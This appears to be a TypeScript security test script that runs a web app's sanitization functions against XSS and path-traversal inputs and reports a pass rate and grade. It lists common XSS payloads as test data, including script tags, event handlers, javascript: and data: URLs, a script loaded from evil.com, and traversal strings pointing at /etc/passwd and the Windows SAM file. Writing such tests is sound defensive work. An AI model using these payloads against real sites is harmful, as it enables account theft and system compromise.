/**
 * XSS Security Test Script
 * Tests XSS protection across all sanitization functions
 */

import {
  sanitizeHTML,
  sanitizeURL,
  sanitizeJSON,
  escapeHTML,
  sanitizeAttribute,
  sanitizeCSS,
  sanitizeFilename,
  containsXSS,
  sanitizeUserContent,
  sanitizeReactProps
} from '../lib/sanitize'

// ANSI color codes for terminal output
const colors = {
  reset: '\x1b[0m',
  green: '\x1b[32m',
  red: '\x1b[31m',
  yellow: '\x1b[33m',
  blue: '\x1b[36m',
  bold: '\x1b[1m'
}

interface TestResult {
  category: string
  test: string
  passed: boolean
  input: string
  output: string
  expected: string
  details?: string
}

const results: TestResult[] = []

function logTest(category: string, test: string, passed: boolean, input: string, output: string, expected: string, details?: string) {
  results.push({ category, test, passed, input, output, expected, details })

  const icon = passed ? '✓' : '✗'
  const color = passed ? colors.green : colors.red
  console.log(`${color}${icon} ${category}: ${test}${colors.reset}`)
  if (!passed) {
    console.log(`  Input: ${input.substring(0, 50)}...`)
    console.log(`  Output: ${output}`)
    console.log(`  Expected: ${expected}`)
    if (details) console.log(`  Details: ${details}`)
  }
}

// Test Suite
console.log(`${colors.bold}${colors.blue}=== XSS Security Test Suite ===${colors.reset}\n`)

// 1. Script Injection Tests
console.log(`${colors.bold}1. Script Injection Tests${colors.reset}`)
const scriptPayloads = [
  '<script>alert("XSS")</script>',
  '<SCRIPT>alert("XSS")</SCRIPT>',
  '<script src="http://evil.com/xss.js"></script>',
  '<<SCRIPT>alert("XSS");//<</SCRIPT>',
  '<script>alert(String.fromCharCode(88,83,83))</script>',
]

scriptPayloads.forEach((payload) => {
  const result = sanitizeHTML(payload)
  const passed = !result.includes('<script') && !result.toLowerCase().includes('script>')
  logTest('Script Injection', 'Block script tags', passed, payload, result, 'No script tags')
})

// 2. Event Handler Injection Tests
console.log(`\n${colors.bold}2. Event Handler Injection Tests${colors.reset}`)
const eventPayloads = [
  '<img src=x onerror=alert("XSS")>',
  '<body onload=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  '<input type="image" src="x" onerror="alert(\'XSS\')">',
  '<div onmouseover="alert(\'XSS\')">Hover me</div>',
]

eventPayloads.forEach((payload) => {
  const result = sanitizeHTML(payload)
  const passed = !result.includes('onerror') && !result.includes('onload') && !result.includes('onmouseover')
  logTest('Event Handler', 'Remove event handlers', passed, payload, result, 'No event handlers')
})

// 3. JavaScript Protocol Tests
console.log(`\n${colors.bold}3. JavaScript Protocol Tests${colors.reset}`)
const jsProtocols = [
  'javascript:alert("XSS")',
  'JaVaScRiPt:alert("XSS")',
  'javascript:void(0)',
  'java%73cript:alert("XSS")',
]

jsProtocols.forEach((payload) => {
  const result = sanitizeURL(payload)
  const passed = result === ''
  logTest('JS Protocol', 'Block javascript: URLs', passed, payload, result, 'Empty string')
})

// 4. Data URI XSS Tests
console.log(`\n${colors.bold}4. Data URI XSS Tests${colors.reset}`)
const dataURIs = [
  'data:text/html,<script>alert("XSS")</script>',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=',
]

dataURIs.forEach((payload) => {
  const result = sanitizeURL(payload)
  const passed = result === ''
  logTest('Data URI', 'Block data: URLs', passed, payload, result, 'Empty string')
})

// 5. CSS Injection Tests
console.log(`\n${colors.bold}5. CSS Injection Tests${colors.reset}`)
const cssPayloads = [
  'background: url("javascript:alert(1)")',
  'width: expression(alert(1))',
  '@import url("evil.css")',
  '-moz-binding: url("evil.xml")',
]

cssPayloads.forEach((payload) => {
  const result = sanitizeCSS(payload)
  const passed = result === ''
  logTest('CSS Injection', 'Block malicious CSS', passed, payload, result, 'Empty string')
})

// 6. HTML Entity Bypass Tests
console.log(`\n${colors.bold}6. HTML Entity Bypass Tests${colors.reset}`)
const entityPayloads = [
  '&lt;script&gt;alert("XSS")&lt;/script&gt;',
  '&#60;script&#62;alert("XSS")&#60;/script&#62;',
]

entityPayloads.forEach((payload) => {
  const result = sanitizeHTML(payload)
  // Entities should be preserved (not decoded and executed)
  const passed = !result.includes('alert(')
  logTest('HTML Entity', 'Handle entities safely', passed, payload, result, 'No executable code')
})

// 7. SVG-based XSS Tests
console.log(`\n${colors.bold}7. SVG-based XSS Tests${colors.reset}`)
const svgPayloads = [
  '<svg><script>alert("XSS")</script></svg>',
  '<svg/onload=alert("XSS")>',
]

svgPayloads.forEach((payload) => {
  const result = sanitizeHTML(payload)
  const passed = !result.includes('<script') && !result.includes('onload')
  logTest('SVG XSS', 'Block SVG vectors', passed, payload, result, 'No executable code')
})

// 8. Path Traversal Tests
console.log(`\n${colors.bold}8. Path Traversal Tests${colors.reset}`)
const pathPayloads = [
  '../../etc/passwd',
  '../../../windows/system32/config/sam',
  'path/to/../../../file.txt',
]

pathPayloads.forEach((payload) => {
  const result = sanitizeFilename(payload)
  const passed = !result.includes('..')
  logTest('Path Traversal', 'Remove traversal sequences', passed, payload, result, 'No .. sequences')
})

// 9. JSON Sanitization Tests
console.log(`\n${colors.bold}9. JSON Sanitization Tests${colors.reset}`)
const jsonPayloads = [
  '{"name":"<script>alert(1)</script>"}',
  '{"html":"<img src=x onerror=alert(1)>"}',
  '{invalid json}',
]

jsonPayloads.forEach((payload) => {
  const result = sanitizeJSON(payload)
  const passed = !result.includes('<script') && !result.includes('onerror')
  logTest('JSON Sanitization', 'Escape dangerous JSON', passed, payload, result, 'Escaped or error message')
})

// 10. XSS Detection Tests
console.log(`\n${colors.bold}10. XSS Detection Tests${colors.reset}`)
const detectPayloads = [
  { input: '<script>alert(1)</script>', shouldDetect: true },
  { input: 'javascript:alert(1)', shouldDetect: true },
  { input: '<img onerror=alert(1)>', shouldDetect: true },
  { input: 'Hello world!', shouldDetect: false },
  { input: '<p>Safe HTML</p>', shouldDetect: false },
]

detectPayloads.forEach(({ input, shouldDetect }) => {
  const result = containsXSS(input)
  const passed = result === shouldDetect
  logTest('XSS Detection', shouldDetect ? 'Detect XSS' : 'Allow safe content', passed, input, String(result), String(shouldDetect))
})

// 11. URL Validation Tests
console.log(`\n${colors.bold}11. URL Validation Tests${colors.reset}`)
const urlTests = [
  { input: 'https://example.com/image.jpg', shouldPass: true },
  { input: 'http://example.com/page', shouldPass: true },
  { input: '/relative/path.jpg', shouldPass: true },
  { input: 'javascript:alert(1)', shouldPass: false },
  { input: 'data:text/html,<script>x</script>', shouldPass: false },
  { input: 'vbscript:msgbox(1)', shouldPass: false },
]

urlTests.forEach(({ input, shouldPass }) => {
  const result = sanitizeURL(input)
  const passed = shouldPass ? (result !== '') : (result === '')
  logTest('URL Validation', shouldPass ? 'Allow safe URL' : 'Block dangerous URL', passed, input, result, shouldPass ? 'Non-empty' : 'Empty')
})

// 12. Edge Cases
console.log(`\n${colors.bold}12. Edge Cases${colors.reset}`)
const edgeCases = [
  { fn: () => escapeHTML(''), label: 'Empty string', expected: '' },
  { fn: () => sanitizeHTML('a'.repeat(10000)), label: 'Very long string', expected: 'a'.repeat(10000) },
  { fn: () => escapeHTML('你好世界 🌍'), label: 'Unicode characters', expected: '你好世界 🌍' },
  { fn: () => sanitizeHTML('<ScRiPt>alert(1)</ScRiPt>'), label: 'Mixed case attack', expected: '' },
]

edgeCases.forEach(({ fn, label, expected }) => {
  try {
    const result = fn()
    const passed = label === 'Very long string' ? result.length > 0 :
                   label === 'Mixed case attack' ? !result.toLowerCase().includes('script') :
                   result === expected
    logTest('Edge Cases', label, passed, '(various)', result.substring(0, 50), expected.substring(0, 50))
  } catch (error) {
    logTest('Edge Cases', label, false, '(various)', 'ERROR', expected, String(error))
  }
})

// 13. React Props Sanitization
console.log(`\n${colors.bold}13. React Props Sanitization${colors.reset}`)
const reactProps: Record<string, string> = {
  title: 'Product <script>alert(1)</script>',
  url: 'javascript:alert(1)',
  href: 'https://example.com',
  description: 'Safe description',
  html: '<b>Bold</b><script>evil</script>',
}

const sanitizedProps = sanitizeReactProps(reactProps)
const propsTests: Array<{ key: string; shouldNotContain?: string; shouldBe?: string; shouldContain?: string }> = [
  { key: 'title', shouldNotContain: '<script' },
  { key: 'url', shouldBe: '' },
  { key: 'href', shouldContain: 'example.com' },
  { key: 'description', shouldBe: 'Safe description' },
  { key: 'html', shouldNotContain: '<script' },
]

propsTests.forEach(({ key, shouldNotContain, shouldBe, shouldContain }) => {
  const value = String(sanitizedProps[key] || '')
  let passed = false
  let expected = ''

  if (shouldNotContain) {
    passed = !value.includes(shouldNotContain)
    expected = `Not containing ${shouldNotContain}`
  } else if (shouldBe !== undefined) {
    passed = value === shouldBe
    expected = shouldBe
  } else if (shouldContain) {
    passed = value.includes(shouldContain)
    expected = `Containing ${shouldContain}`
  }

  logTest('React Props', `Sanitize ${key}`, passed, String(reactProps[key]), value, expected)
})

// Summary
console.log(`\n${colors.bold}${colors.blue}=== Test Summary ===${colors.reset}`)
const totalTests = results.length
const passedTests = results.filter(r => r.passed).length
const failedTests = totalTests - passedTests
const passRate = ((passedTests / totalTests) * 100).toFixed(2)

console.log(`Total Tests: ${totalTests}`)
console.log(`${colors.green}Passed: ${passedTests}${colors.reset}`)
console.log(`${failedTests > 0 ? colors.red : colors.green}Failed: ${failedTests}${colors.reset}`)
console.log(`Pass Rate: ${passRate}%`)

// Security Score
let securityScore = 'F'
if (passRate === '100.00') securityScore = 'A+'
else if (parseFloat(passRate) >= 95) securityScore = 'A'
else if (parseFloat(passRate) >= 90) securityScore = 'B'
else if (parseFloat(passRate) >= 80) securityScore = 'C'
else if (parseFloat(passRate) >= 70) securityScore = 'D'

console.log(`\n${colors.bold}Security Score: ${securityScore}${colors.reset}`)

// Category Breakdown
console.log(`\n${colors.bold}Category Breakdown:${colors.reset}`)
const categories = Array.from(new Set(results.map(r => r.category)))
categories.forEach(category => {
  const categoryTests = results.filter(r => r.category === category)
  const categoryPassed = categoryTests.filter(r => r.passed).length
  const categoryTotal = categoryTests.length
  const categoryRate = ((categoryPassed / categoryTotal) * 100).toFixed(0)
  const color = categoryPassed === categoryTotal ? colors.green : colors.yellow
  console.log(`${color}${category}: ${categoryPassed}/${categoryTotal} (${categoryRate}%)${colors.reset}`)
})

// Failed Tests Detail
if (failedTests > 0) {
  console.log(`\n${colors.bold}${colors.red}Failed Tests:${colors.reset}`)
  results.filter(r => !r.passed).forEach(r => {
    console.log(`\n${colors.red}✗ ${r.category}: ${r.test}${colors.reset}`)
    console.log(`  Input: ${r.input.substring(0, 80)}`)
    console.log(`  Output: ${r.output.substring(0, 80)}`)
    console.log(`  Expected: ${r.expected}`)
    if (r.details) console.log(`  Details: ${r.details}`)
  })
}

// Exit with appropriate code
process.exit(failedTests > 0 ? 1 : 0)
